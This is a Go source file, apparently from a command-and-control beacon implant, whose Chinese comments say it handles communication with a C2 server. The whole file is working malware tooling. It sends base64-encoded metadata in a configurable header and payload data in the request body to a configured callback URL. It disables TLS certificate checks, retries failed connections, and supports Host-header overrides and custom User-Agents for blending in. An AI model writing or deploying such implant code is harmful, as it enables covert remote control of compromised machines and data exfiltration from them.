package http

import (
	"beacon/pkg/profile"
	"bytes"
	"crypto/tls"
	"encoding/base64"
	"io"
	"net/http"
	"time"
)

// HttpClient 处理与 C2 服务器的通信。
type HttpClient struct {
	client *http.Client
}

func NewHttpClient() *HttpClient {
	return &HttpClient{
		client: &http.Client{
			Timeout: profile.GlobalProfile.ConnTimeout,
			Transport: &http.Transport{
				TLSClientConfig: &tls.Config{
					InsecureSkipVerify: true,
				},
			},
		},
	}
}

// SendData 将数据发送到配置的回调地址。
// metadata 始终放入 Header (Cookie)，payload 放入 Body (如果存在)。
func (h *HttpClient) SendData(metadata []byte, payload []byte) ([]byte, error) {
	reconnectCount := profile.GlobalProfile.HTTP.ReconnectCount
	if reconnectCount < 0 {
		reconnectCount = 0
	}
	reconnectDelay := time.Duration(profile.GlobalProfile.HTTP.ReconnectTime) * time.Millisecond

	var lastErr error
	for attempt := 0; attempt <= reconnectCount; attempt++ {
		resBody, err := h.sendOnce(metadata, payload)
		if err == nil {
			return resBody, nil
		}
		lastErr = err
		if attempt < reconnectCount && reconnectDelay > 0 {
			time.Sleep(reconnectDelay)
		}
	}

	return nil, lastErr
}

func (h *HttpClient) sendOnce(metadata []byte, payload []byte) ([]byte, error) {
	var requestBody io.Reader
	if len(payload) > 0 {
		requestBody = bytes.NewBuffer(payload)
	}

	method := profile.GlobalProfile.HTTP.Method
	if method == "" {
		method = "GET"
	}

	req, err := http.NewRequest(method, profile.GlobalProfile.GetUrl(), requestBody)
	if err != nil {
		return nil, err
	}

	if len(metadata) > 0 {
		encodedMetadata := base64.RawURLEncoding.EncodeToString(metadata)
		req.Header.Set(profile.GlobalProfile.HTTP.HBHeader, profile.GlobalProfile.HTTP.HBPrefix+encodedMetadata)
	}

	contentType := profile.GlobalProfile.HTTP.ContentType
	if contentType == "" {
		contentType = "application/octet-stream"
	}
	req.Header.Set("Content-Type", contentType)

	if hostHeader := profile.GlobalProfile.HTTP.HostHeader; hostHeader != "" {
		req.Host = hostHeader
	}

	if ua := profile.GlobalProfile.HTTP.UserAgent; ua != "" {
		req.Header.Set("User-Agent", ua)
	}

	resp, err := h.client.Do(req)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()

	resBody, err := io.ReadAll(resp.Body)
	if err != nil {
		return nil, err
	}

	return resBody, nil
}
